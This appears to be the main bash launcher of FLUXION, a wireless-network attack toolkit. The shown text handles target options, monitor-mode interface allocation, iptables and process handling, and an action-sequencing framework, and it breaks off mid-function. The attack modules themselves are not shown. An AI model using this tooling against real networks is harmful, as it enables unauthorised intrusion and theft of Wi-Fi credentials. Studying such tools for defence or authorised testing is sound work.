#!/usr/bin/env bash

# ============================================================ #
# ================== < FLUXION Parameters > ================== #
# ============================================================ #
# Path to directory containing the FLUXION executable script.
readonly FLUXIONPath=$(dirname $(readlink -f "$0"))

# Path to directory containing the FLUXION library (scripts).
readonly FLUXIONLibPath="$FLUXIONPath/lib"

# Path to the temp. directory available to FLUXION & subscripts.
readonly FLUXIONWorkspacePath="/tmp/fluxspace"
readonly FLUXIONIPTablesBackup="$FLUXIONPath/iptables-rules"

# Path to FLUXION's preferences file, to be loaded afterward.
readonly FLUXIONPreferencesFile="$FLUXIONPath/preferences/preferences.conf"

# Constants denoting the reference noise floor & ceiling levels.
# These are used by the the wireless network scanner visualizer.
readonly FLUXIONNoiseFloor=-90
readonly FLUXIONNoiseCeiling=-60

readonly FLUXIONVersion=6
readonly FLUXIONRevision=9

# Declare window ration bigger = smaller windows
FLUXIONWindowRatio=4

# Allow to skip dependencies if required, not recommended
FLUXIONSkipDependencies=1

# Check if there are any missing dependencies
FLUXIONMissingDependencies=0

# Allow to use 5ghz support
FLUXIONEnable5GHZ=0

# ============================================================ #
# ================= < Script Sanity Checks > ================= #
# ============================================================ #
if [ $EUID -ne 0 ]; then # Super User Check
  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
fi

# ===================== < XTerm Checks > ===================== #
# TODO: Run the checks below only if we're not using tmux.
if [ ! "${DISPLAY:-}" ]; then # Assure display is available.
  echo -e "\\033[31mAborted, X (graphical) session unavailable.\\033[0m"; exit 2
fi

if ! hash xdpyinfo 2>/dev/null; then # Assure display probe.
  echo -e "\\033[31mAborted, xdpyinfo is unavailable.\\033[0m"; exit 3
fi

if ! xdpyinfo &>/dev/null; then # Assure display info available.
  echo -e "\\033[31mAborted, xterm test session failed.\\033[0m"; exit 4
fi

# ================ < Parameter Parser Check > ================ #
getopt --test > /dev/null # Assure enhanced getopt (returns 4).
if [ $? -ne 4 ]; then
  echo "\\033[31mAborted, enhanced getopt isn't available.\\033[0m"; exit 5
fi

# =============== < Working Directory Check > ================ #
if ! mkdir -p "$FLUXIONWorkspacePath" &> /dev/null; then
  echo "\\033[31mAborted, can't generate a workspace directory.\\033[0m"; exit 6
fi

# Once sanity check is passed, we can start to load everything.

# ============================================================ #
# =================== < Library Includes > =================== #
# ============================================================ #
source "$FLUXIONLibPath/installer/InstallerUtils.sh"
source "$FLUXIONLibPath/InterfaceUtils.sh"
source "$FLUXIONLibPath/SandboxUtils.sh"
source "$FLUXIONLibPath/FormatUtils.sh"
source "$FLUXIONLibPath/ColorUtils.sh"
source "$FLUXIONLibPath/IOUtils.sh"
source "$FLUXIONLibPath/HashUtils.sh"
source "$FLUXIONLibPath/HelpUtils.sh"

# NOTE: These are configured after arguments are loaded (later).

# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if ! FLUXIONCLIArguments=$(
    getopt --options="vdk5rinmthb:e:c:l:a:r" \
      --longoptions="debug,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies" \
      --name="FLUXION V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
  ); then
  echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
fi

AttackCLIArguments=${FLUXIONCLIArguments##* -- }
readonly FLUXIONCLIArguments=${FLUXIONCLIArguments%%-- *}
if [ "$AttackCLIArguments" = "$FLUXIONCLIArguments" ]; then
  AttackCLIArguments=""
fi


# ============================================================ #
# ================== < Load Configurables > ================== #
# ============================================================ #

# ============= < Argument Loaded Configurables > ============ #
eval set -- "$FLUXIONCLIArguments" # Set environment parameters.

#[ "$1" != "--" ] && readonly FLUXIONAuto=1 # Auto-mode if using CLI.
while [ "$1" != "" ] && [ "$1" != "--" ]; do
  case "$1" in
    -v|--version) echo "FLUXION V$FLUXIONVersion.$FLUXIONRevision"; exit;;
    -h|--help) fluxion_help; exit;;
    -d|--debug) readonly FLUXIONDebug=1;;
    -k|--killer) readonly FLUXIONWIKillProcesses=1;;
    -5|--5ghz) FLUXIONEnable5GHZ=1;;
    -r|--reloader) readonly FLUXIONWIReloadDriver=1;;
    -n|--airmon-ng) readonly FLUXIONAirmonNG=1;;
    -m|--multiplexer) readonly FLUXIONTMux=1;;
    -b|--bssid) FluxionTargetMAC=$2; shift;;
    -e|--essid) FluxionTargetSSID=$2;
      # TODO: Rearrange declarations to have routines available for use here.
      FluxionTargetSSIDClean=$(echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'); shift;;
    -c|--channel) FluxionTargetChannel=$2; shift;;
    -l|--language) FluxionLanguage=$2; shift;;
    -a|--attack) FluxionAttack=$2; shift;;
    -i|--install) FLUXIONSkipDependencies=0; shift;;
    --ratio) FLUXIONWindowRatio=$2; shift;;
    --auto) readonly FLUXIONAuto=1;;
    --skip-dependencies) readonly FLUXIONSkipDependencies=1;;
  esac
  shift # Shift new parameters
done

shift # Remove "--" to prepare for attacks to read parameters.
# Executable arguments are handled after subroutine definition.

# =================== < User Preferences > =================== #
# Load user-defined preferences if there's an executable script.
# If no script exists, prepare one for the user to store config.
# WARNING: Preferences file must assure no redeclared constants.
if [ -x "$FLUXIONPreferencesFile" ]; then
  source "$FLUXIONPreferencesFile"
else
  echo '#!/usr/bin/env bash' > "$FLUXIONPreferencesFile"
  chmod u+x "$FLUXIONPreferencesFile"
fi

# ================ < Configurable Constants > ================ #
if [ "$FLUXIONAuto" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONAuto=${FLUXIONAuto:+1}
fi

if [ "$FLUXIONDebug" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONDebug=${FLUXIONDebug:+1}
fi

if [ "$FLUXIONAirmonNG" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONAirmonNG=${FLUXIONAirmonNG:+1}
fi

if [ "$FLUXIONWIKillProcesses" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONWIKillProcesses=${FLUXIONWIKillProcesses:+1}
fi

if [ "$FLUXIONWIReloadDriver" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONWIReloadDriver=${FLUXIONWIReloadDriver:+1}
fi

# FLUXIONDebug [Normal Mode "" / Developer Mode 1]
if [ $FLUXIONDebug ]; then
  :> /tmp/fluxion.debug.log
  readonly FLUXIONOutputDevice="/tmp/fluxion.debug.log"
  readonly FLUXIONHoldXterm="-hold"
else
  readonly FLUXIONOutputDevice=/dev/null
  readonly FLUXIONHoldXterm=""
fi

# ================ < Configurable Variables > ================ #
readonly FLUXIONPromptDefault="$CRed[${CSBlu}fluxion$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
FLUXIONPrompt=$FLUXIONPromptDefault

readonly FLUXIONVLineDefault="$CRed[$CSYel*$CClr$CRed]$CClr"
FLUXIONVLine=$FLUXIONVLineDefault

# ================== < Library Parameters > ================== #
readonly InterfaceUtilsOutputDevice="$FLUXIONOutputDevice"

readonly SandboxWorkspacePath="$FLUXIONWorkspacePath"
readonly SandboxOutputDevice="$FLUXIONOutputDevice"

readonly InstallerUtilsWorkspacePath="$FLUXIONWorkspacePath"
readonly InstallerUtilsOutputDevice="$FLUXIONOutputDevice"
readonly InstallerUtilsNoticeMark="$FLUXIONVLine"

readonly PackageManagerLog="$InstallerUtilsWorkspacePath/package_manager.log"

declare  IOUtilsHeader="fluxion_header"
readonly IOUtilsQueryMark="$FLUXIONVLine"
readonly IOUtilsPrompt="$FLUXIONPrompt"

readonly HashOutputDevice="$FLUXIONOutputDevice"

# ============================================================ #
# =================== < Default Language > =================== #
# ============================================================ #
# Set by default in case fluxion is aborted before setting one.
source "$FLUXIONPath/language/en.sh"

# ============================================================ #
# ================== < Startup & Shutdown > ================== #
# ============================================================ #
fluxion_startup() {
  if [ "$FLUXIONDebug" ]; then return 1; fi

  # Make sure that we save the iptable files
  iptables-save >"$FLUXIONIPTablesBackup"
  local banner=()

  format_center_literals \
    " ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    "¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯"
  banner+=("$FormatCenterLiterals")

  clear

  if [ "$FLUXIONAuto" ]; then echo -e "$CBlu"; else echo -e "$CRed"; fi

  for line in "${banner[@]}"; do
    echo "$line"; sleep 0.05
  done

  echo # Do not remove.

  sleep 0.1
  local -r fluxionRepository="https://github.com/FluxionNetwork/fluxion"
  format_center_literals "${CGrn}Site: ${CRed}$fluxionRepository$CClr"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  local -r versionInfo="${CSRed}FLUXION $FLUXIONVersion$CClr"
  local -r revisionInfo="(rev. $CSBlu$FLUXIONRevision$CClr)"
  local -r credits="by$CCyn FluxionNetwork$CClr"
  format_center_literals "$versionInfo $revisionInfo $credits"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  local -r fluxionDomain="raw.githubusercontent.com"
  local -r fluxionPath="FluxionNetwork/fluxion/master/fluxion.sh"
  local -r updateDomain="github.com"
  local -r updatePath="FluxionNetwork/fluxion/archive/master.zip"
  if installer_utils_check_update "https://$fluxionDomain/$fluxionPath" \
    "FLUXIONVersion=" "FLUXIONRevision=" \
    $FLUXIONVersion $FLUXIONRevision; then
    if installer_utils_run_update "https://$updateDomain/$updatePath" \
      "FLUXION-V$FLUXIONVersion.$FLUXIONRevision" "$FLUXIONPath"; then
      fluxion_shutdown
    fi
  fi

  echo # Do not remove.

  local requiredCLITools=(
    "aircrack-ng" "bc" "awk:awk|gawk|mawk"
    "curl" "cowpatty" "dhcpd:isc-dhcp-server|dhcp" "7zr:p7zip" "hostapd" "lighttpd"
    "iwconfig:wireless-tools" "macchanger" "mdk4" "dsniff" "mdk3" "nmap" "openssl"
    "php-cgi" "xterm" "rfkill" "unzip" "route:net-tools"
    "fuser:psmisc" "killall:psmisc"
  )

    while ! installer_utils_check_dependencies requiredCLITools[@]; do
        if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
            echo
            echo -e "${CRed}Dependency installation failed!$CClr"
            echo    "Press enter to retry, ctrl+c to exit..."
            read -r bullshit
        fi
    done
    if [ $FLUXIONMissingDependencies -eq 1 ]  && [ $FLUXIONSkipDependencies -eq 1 ];then
        echo -e "\n\n"
        format_center_literals "[ ${CSRed}Missing dependencies: try to install using ./fluxion.sh -i${CClr} ]"
        echo -e "$FormatCenterLiterals"; sleep 3

        exit 7
    fi

  echo -e "\\n\\n" # This echo is for spacing
}

fluxion_shutdown() {
  if [ $FLUXIONDebug ]; then return 1; fi

  # Show the header if the subroutine has already been loaded.
  if type -t fluxion_header &> /dev/null; then
    fluxion_header
  fi

  echo -e "$CWht[$CRed-$CWht]$CRed $FLUXIONCleanupAndClosingNotice$CClr"

  # Get running processes we might have to kill before exiting.
  local processes
  readarray processes < <(ps -A)

  # Currently, fluxion is only responsible for killing airodump-ng, since
  # fluxion explicitly uses it to scan for candidate target access points.
  # NOTICE: Processes started by subscripts, such as an attack script,
  # MUST BE TERMINATED BY THAT SCRIPT in the subscript's abort handler.
  local -r targets=("airodump-ng")

  local targetID # Program identifier/title
  for targetID in "${targets[@]}"; do
    # Get PIDs of all programs matching targetPID
    local targetPID
    targetPID=$(
      echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}'
    )
    if [ ! "$targetPID" ]; then continue; fi
    echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
    kill -s SIGKILL $targetPID &> $FLUXIONOutputDevice
  done
  kill -s SIGKILL $authService &> $FLUXIONOutputDevice

  # Assure changes are reverted if installer was activated.
  if [ "$PackageManagerCLT" ]; then
    echo -e "$CWht[$CRed-$CWht] "$(
      io_dynamic_output "$FLUXIONRestoringPackageManagerNotice"
    )"$CClr"
    # Notice: The package manager has already been restored at this point.
    # InstallerUtils assures the manager is restored after running operations.
  fi

  # If allocated interfaces exist, deallocate them now.
  if [ ${#FluxionInterfaces[@]} -gt 0 ]; then
    local interface
    for interface in "${!FluxionInterfaces[@]}"; do
      # Only deallocate fluxion or airmon-ng created interfaces.
      if [[ "$interface" == "flux"* || "$interface" == *"mon"* || "$interface" == "prism"* ]]; then
        fluxion_deallocate_interface $interface
      fi
    done
  fi

  echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingCleaningIPTablesNotice$CClr"
  if [ -f "$FLUXIONIPTablesBackup" ]; then
    iptables-restore <"$FLUXIONIPTablesBackup" \
      &> $FLUXIONOutputDevice
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  echo -e "$CWht[$CRed-$CWht] $FLUXIONRestoringTputNotice$CClr"
  tput cnorm

  if [ ! $FLUXIONDebug ]; then
    echo -e "$CWht[$CRed-$CWht] $FLUXIONDeletingFilesNotice$CClr"
    sandbox_remove_workfile "$FLUXIONWorkspacePath/*"
  fi

  if [ $FLUXIONWIKillProcesses ]; then
    echo -e "$CWht[$CRed-$CWht] $FLUXIONRestartingNetworkManagerNotice$CClr"

    # TODO: Add support for other network managers (wpa_supplicant?).
    if [ ! -x "$(command -v systemctl)" ]; then
        if [ -x "$(command -v service)" ];then
        service network-manager restart &> $FLUXIONOutputDevice &
        service networkmanager restart &> $FLUXIONOutputDevice &
        service networking restart &> $FLUXIONOutputDevice &
      fi
    else
      systemctl restart network-manager.service &> $FLUXIONOutputDevice &
    fi
  fi

  echo -e "$CWht[$CGrn+$CWht] $CGrn$FLUXIONCleanupSuccessNotice$CClr"
  echo -e "$CWht[$CGrn+$CWht] $CGry$FLUXIONThanksSupportersNotice$CClr"

  sleep 3

  clear

  exit 0
}


# ============================================================ #
# ================== < Helper Subroutines > ================== #
# ============================================================ #
# The following will kill the parent proces & all its children.
fluxion_kill_lineage() {
  if [ ${#@} -lt 1 ]; then return -1; fi

  if [ ! -z "$2" ]; then
    local -r options=$1
    local match=$2
  else
    local -r options=""
    local match=$1
  fi

  # Check if the match isn't a number, but a regular expression.
  # The following might
  if ! [[ "$match" =~ ^[0-9]+$ ]]; then
    match=$(pgrep -f $match 2> $FLUXIONOutputDevice)
  fi

  # Check if we've got something to kill, abort otherwise.
  if [ -z "$match" ]; then return -2; fi

  kill $options $(pgrep -P $match 2> $FLUXIONOutputDevice) \
    &> $FLUXIONOutputDevice
  kill $options $match &> $FLUXIONOutputDevice
}


# ============================================================ #
# ================= < Handler Subroutines > ================== #
# ============================================================ #
# Delete log only in Normal Mode !
fluxion_conditional_clear() {
  # Clear iff we're not in debug mode
  if [ ! $FLUXIONDebug ]; then clear; fi
}

fluxion_conditional_bail() {
  echo ${1:-"Something went wrong, whoops! (report this)"}
  sleep 5
  if [ ! $FLUXIONDebug ]; then
    fluxion_handle_exit
    return 1
  fi
  echo "Press any key to continue execution..."
  read -r bullshit
}

# ERROR Report only in Developer Mode
if [ $FLUXIONDebug ]; then
  fluxion_error_report() {
    echo "Exception caught @ line #$1"
  }

  trap 'fluxion_error_report $LINENO' ERR
fi

fluxion_handle_abort_attack() {
  if [ $(type -t stop_attack) ]; then
    stop_attack &> $FLUXIONOutputDevice
    unprep_attack &> $FLUXIONOutputDevice
  else
    echo "Attack undefined, can't stop anything..." > $FLUXIONOutputDevice
  fi

  fluxion_target_tracker_stop
}

# In case of abort signal, abort any attacks currently running.
trap fluxion_handle_abort_attack SIGABRT

fluxion_handle_exit() {
  fluxion_handle_abort_attack
  fluxion_shutdown
  exit 1
}

# In case of unexpected termination, run fluxion_shutdown.
trap fluxion_handle_exit SIGINT SIGHUP


fluxion_handle_target_change() {
  echo "Target change signal received!" > $FLUXIONOutputDevice

  local targetInfo
  readarray -t targetInfo < <(more "$FLUXIONWorkspacePath/target_info.txt")

  FluxionTargetMAC=${targetInfo[0]}
  FluxionTargetSSID=${targetInfo[1]}
  FluxionTargetChannel=${targetInfo[2]}

  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)

  if ! stop_attack; then
    fluxion_conditional_bail "Target tracker failed to stop attack."
  fi

  if ! unprep_attack; then
    fluxion_conditional_bail "Target tracker failed to unprep attack."
  fi

  if ! load_attack "$FLUXIONPath/attacks/$FluxionAttack/attack.conf"; then
    fluxion_conditional_bail "Target tracker failed to load attack."
  fi

  if ! prep_attack; then
    fluxion_conditional_bail "Target tracker failed to prep attack."
  fi

  if ! fluxion_run_attack; then
    fluxion_conditional_bail "Target tracker failed to start attack."
  fi
}

# If target monitoring enabled, act on changes.
trap fluxion_handle_target_change SIGALRM


# ============================================================ #
# =============== < Resolution & Positioning > =============== #
# ============================================================ #
fluxion_set_resolution() { # Windows + Resolution

  # Get dimensions
  # Verify this works on Kali before commiting.
  # shopt -s checkwinsize; (:;:)
  # SCREEN_SIZE_X="$LINES"
  # SCREEN_SIZE_Y="$COLUMNS"

  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  # Calculate proportional windows
  if hash bc ;then
    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))

    # Upper windows
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # Lower windows
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y mid
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # Big
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
  fi
}


# ============================================================ #
# ================= < Sequencing Framework > ================= #
# ============================================================ #
# The following lists some problems with the framework's design.
# The list below is a list of DESIGN FLAWS, not framework bugs.
# * Sequenced undo instructions' return value is being ignored.
# * A global is generated for every new namespace being used.
# * It uses eval too much, but it's bash, so that's not so bad.
# TODO: Try to fix this or come up with a better alternative.
declare -rA FLUXIONUndoable=( \
  ["set"]="unset" \
  ["prep"]="unprep" \
  ["run"]="halt" \
  ["start"]="stop" \
)

# Yes, I know, the identifiers are fucking ugly. If only we had
# some type of mangling with bash identifiers, that'd be great.
fluxion_do() {
  if [ ${#@} -lt 2 ]; then return -1; fi

  local -r __fluxion_do__namespace=$1
  local -r __fluxion_do__identifier=$2

  # Notice, the instruction will be adde to the Do Log
  # regardless of whether it succeeded or failed to execute.
  eval FXDLog_$__fluxion_do__namespace+=\("$__fluxion_do__identifier"\)
  eval ${__fluxion_do__namespace}_$__fluxion_do__identifier "${@:3}"
  return $?
}

fluxion_undo() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_undo__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  eval local __fluxion_undo__history=\("\${FXDLog_$__fluxion_undo__namespace[@]}"\)

  eval echo \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
    > $FLUXIONOutputDevice

  local __fluxion_undo__i
  for (( __fluxion_undo__i=${#__fluxion_undo__history[@]}; \
    __fluxion_undo__i > 0; __fluxion_undo__i-- )); do
    local __fluxion_undo__instruction=${__fluxion_undo__history[__fluxion_undo__i-1]}
    local __fluxion_undo__command=${__fluxion_undo__instruction%%_*}
    local __fluxion_undo__identifier=${__fluxion_undo__instruction#*_}

    echo "Do ${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier" \
      > $FLUXIONOutputDevice
    if eval ${__fluxion_undo__namespace}_${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier; then
      echo "Undo-chain succeded." > $FLUXIONOutputDevice
      eval FXDLog_$__fluxion_undo__namespace=\("${__fluxion_undo__history[@]::$__fluxion_undo__i}"\)
      eval echo History\: \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
        > $FLUXIONOutputDevice
      return 0
    fi
  done

  return -2 # The undo-chain failed.
}

fluxion_done() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_done__namespace=$1

  eval "FluxionDone=\${FXDLog_$__fluxion_done__namespace[-1]}"

  if [ ! "$FluxionDone" ]; then return 1; fi
}

fluxion_done_reset() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_done_reset__namespace=$1

  eval FXDLog_$__fluxion_done_reset__namespace=\(\)
}

fluxion_do_sequence() {
  if [ ${#@} -ne 2 ]; then return 1; fi

  # TODO: Implement an alternative, better method of doing
  # what this subroutine does, maybe using for-loop iteFLUXIONWindowRation.
  # The for-loop implementation must support the subroutines
  # defined above, including updating the namespace tracker.

  local -r __fluxion_do_sequence__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local __fluxion_do_sequence__sequence=("${!2}")

  if [ ${#__fluxion_do_sequence__sequence[@]} -eq 0 ]; then
    return -2
  fi

  local -A __fluxion_do_sequence__index=()

  local i
  for i in $(seq 0 $((${#__fluxion_do_sequence__sequence[@]} - 1))); do
    __fluxion_do_sequence__index["${__fluxion_do_sequence__sequence[i]}"]=$i
  done

  # Start sequence with the first instruction available.
  local __fluxion_do_sequence__instructionIndex=0
  local __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[0]}
  while [ "$__fluxion_do_sequence__instruction" ]; do
    if ! fluxion_do $__fluxion_do_sequence__namespace $__fluxion_do_sequence__instruction; then
      if ! fluxion_undo $__fluxion_do_sequence__namespace; then
        return -2
      fi

      # Synchronize the current instruction's index by checking last.
      if ! fluxion_done $__fluxion_do_sequence__namespace; then
        return -3;
      fi

      __fluxion_do_sequence__instructionIndex=${__fluxion_do_sequence__index["$FluxionDone"]}

      if [ ! "$__fluxion_do_sequence__instructionIndex" ]; then
        return -4
      fi
    else
      let __fluxion_do_sequence__instructionIndex++
    fi

    __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[$__fluxion_do_sequence__instructionIndex]}
    echo "Running next: $__fluxion_do_sequence__instruction" \
      > $FLUXIONOutputDevice
  done
}


# ============================================================ #
# ================= < Load All Subroutines > ================= #
# ============================================================ #
fluxion_header() {
  format_apply_autosize "[%*s]\n"
  local verticalBorder=$FormatApplyAutosize

  format_apply_autosize "[%*s${CSRed}FLUXION $FLUXIONVersion${CSWht}.${CSBlu}$FLUXIONRevision$CSRed    <$CIRed F${CIYel}luxion$CIRed I${CIYel}s$CIRed T${CIYel}he$CIRed F${CIYel}uture$CClr$CSYel >%*s$CSBlu]\n"
  local headerTextFormat="$FormatApplyAutosize"

  fluxion_conditional_clear

  echo -e "$(printf "$CSRed$verticalBorder" "" | sed -r "s/ /~/g")"
  printf "$CSRed$verticalBorder" ""
  printf "$headerTextFormat" "" ""
  printf "$CSBlu$verticalBorder" ""
  echo -e "$(printf "$CSBlu$verticalBorder" "" | sed -r "s/ /~/g")$CClr"
  echo
  echo
}

# ======================= < Language > ======================= #
fluxion_unset_language() {
  FluxionLanguage=""

  if [ "$FLUXIONPreferencesFile" ]; then
    sed -i.backup "/FluxionLanguage=.\+/ d" "$FLUXIONPreferencesFile"
  fi
}

fluxion_set_language() {
  if [ ! "$FluxionLanguage" ]; then
    # Get all languages available.
    local languageCodes
    readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')

    local languages
    readarray -t languages < <(
      head -n 3 language/*.sh |
      grep -E "^# native: " |
      sed -E 's/# \w+: //'
    )

    io_query_format_fields "$FLUXIONVLine Select your language" \
      "\t$CRed[$CSYel%d$CClr$CRed]$CClr %s / %s\n" \
      languageCodes[@] languages[@]

    FluxionLanguage=${IOQueryFormatFields[0]}

    echo # Do not remove.
  fi

  # Check if all language files are present for the selected language.
  find -type d -name language | while read language_dir; do
    if [ ! -e "$language_dir/${FluxionLanguage}.sh" ]; then
      echo -e "$FLUXIONVLine ${CYel}Warning${CClr}, missing language file:"
      echo -e "\t$language_dir/${FluxionLanguage}.sh"
      return 1
    fi
  done

  if [ $? -eq 1 ]; then # If a file is missing, fall back to english.
    echo -e "\n\n$FLUXIONVLine Falling back to English..."; sleep 5
    FluxionLanguage="en"
  fi

  source "$FLUXIONPath/language/$FluxionLanguage.sh"

  if [ "$FLUXIONPreferencesFile" ]; then
    if more $FLUXIONPreferencesFile | \
      grep -q "FluxionLanguage=.\+" &> /dev/null; then
      sed -r "s/FluxionLanguage=.+/FluxionLanguage=$FluxionLanguage/g" \
      -i.backup "$FLUXIONPreferencesFile"
    else
      echo "FluxionLanguage=$FluxionLanguage" >> "$FLUXIONPreferencesFile"
    fi
  fi
}

# ====================== < Interfaces > ====================== #
declare -A FluxionInterfaces=() # Global interfaces' registry.

fluxion_deallocate_interface() { # Release interfaces
  if [ ! "$1" ] || ! interface_is_real $1; then return 1; fi

  local -r oldIdentifier=$1
  local -r newIdentifier=${FluxionInterfaces[$oldIdentifier]}

  # Assure the interface is in the allocation table.
  if [ ! "$newIdentifier" ]; then return 2; fi

  local interfaceIdentifier=$newIdentifier
  echo -e "$CWht[$CSRed-$CWht] "$(
    io_dynamic_output "$FLUXIONDeallocatingInterfaceNotice"
  )"$CClr"

  if interface_is_wireless $oldIdentifier; then
    # If interface was allocated by airmon-ng, deallocate with it.
    if [[ "$oldIdentifier" == *"mon"* || "$oldIdentifier" == "prism"* ]]; then
      if ! airmon-ng stop $oldIdentifier &> $FLUXIONOutputDevice; then
        return 4
      fi
    else
      # Attempt deactivating monitor mode on the interface.
      if ! interface_set_mode $oldIdentifier managed; then
        return 3
      fi

      # Attempt to restore the original interface identifier.
      if ! interface_reidentify "$oldIdentifier" "$newIdentifier"; then
        return 5
      fi
    fi
  fi

  # Once successfully renamed, remove from allocation table.
  unset FluxionInterfaces[$oldIdentifier]
  unset FluxionInterfaces[$newIdentifier]
}

# Parameters: <interface_identifier>
# ------------------------------------------------------------ #
# Return 1: No interface identifier was passed.
# Return 2: Interface identifier given points to no interface.
# Return 3: Unable to determine interface's driver.
# Return 4: Fluxion failed to reidentify interface.
# Return 5: Interface allocation failed (identifier missing).
fluxion_allocate_interface() { # Reserve interfaces
  if [ ! "$1" ]; then return 1; fi

  local -r identifier=$1

  # If the interface is already in allocation table, we're done.
  if [ "${FluxionInterfaces[$identifier]+x}" ]; then
    return 0
  fi

  if ! interface_is_real $identifier; then return 2; fi


  local interfaceIdentifier=$identifier
  echo -e "$CWht[$CSGrn+$CWht] "$(
    io_dynamic_output "$FLUXIONAllocatingInterfaceNotice"
  )"$CClr"


  if interface_is_wireless $identifier; then
    # Unblock wireless interfaces to make them available.
    echo -e "$FLUXIONVLine $FLUXIONUnblockingWINotice"
    rfkill unblock all &> $FLUXIONOutputDevice

    if [ "$FLUXIONWIReloadDriver" ]; then
      # Get selected interface's driver details/info-descriptor.
